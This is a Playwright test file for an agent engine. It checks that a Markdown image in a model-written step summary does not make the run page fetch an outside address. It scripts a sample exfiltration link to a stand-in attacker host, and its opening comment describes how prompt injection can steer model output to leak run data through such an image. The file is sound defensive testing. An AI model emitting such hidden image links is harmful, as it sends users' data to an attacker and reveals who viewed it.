import { writeFileSync } from "node:fs"
import path from "node:path"
import { test, expect } from "../fixtures/engine.ts"

// A step summary is model output, which a prompt injection can steer. Shown
// as Markdown on the run page, an image in it must not make the browser of
// whoever views the run fetch an outside address: that leaks whatever the
// injected text put in the URL, and tells the attacker who looked.

const GRAPH = `apiVersion: openengine.cc/v1
kind: Graph
name: summarize
plan:
  summarize:
    agent: claude
    prompt: Reply with one sentence summarizing README.md. Don't run commands or change files.
`

const EXFILTRATION = "http://attacker.invalid/pixel.png?d=leaked-run-data"

test.describe("Markdown step summaries", { tag: "@skip-docs" }, () => {
  test("an image in a step summary fetches nothing from outside", async ({ engine, terminal, context }) => {
    test.skip(engine.agentMode !== "stub", "the summary is scripted")
    engine.script({ scenarios: [{ steps: [{ type: "say", text: `Summary done.\n\n![logo](${EXFILTRATION})` }] }] })
    writeFileSync(path.join(engine.repository, "summarize.yaml"), GRAPH)
    await terminal.run("engine graph add summarize.yaml")
    await terminal.run("engine graph run summarize --no-watch --trust")

    const headers = { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` }
    let runId = ""
    await expect.poll(async () => {
      const runs = (await (await fetch(`${engine.url}/api/v1/runs`, { headers })).json()).runs as { runId: string; status: string }[]
      runId = runs[0]?.runId ?? ""
      return runs[0]?.status
    }, { timeout: 60_000 }).toBe("completed")

    const outside: string[] = []
    const page = await context.newPage()
    await page.route(`${engine.url}/**`, (route) => route.continue({ headers: { ...route.request().headers(), ...headers } }))
    await page.route("http://attacker.invalid/**", (route) => {
      outside.push(route.request().url())
      return route.abort()
    })
    await page.goto(`${engine.url}/runs/${encodeURIComponent(runId)}`)
    const summary = page.locator(".step-summary").filter({ hasText: "Summary done." })
    await expect(summary).toBeAttached({ timeout: 30_000 })
    // Open the step's group, as a viewer reading the summary does.
    for (const group of await page.locator("details:not([open]) > summary").all()) await group.click()
    await expect(summary).toBeVisible()
    await page.waitForLoadState("networkidle")

    expect(outside, "the run page fetched an address named in a step summary").toEqual([])
  })
})
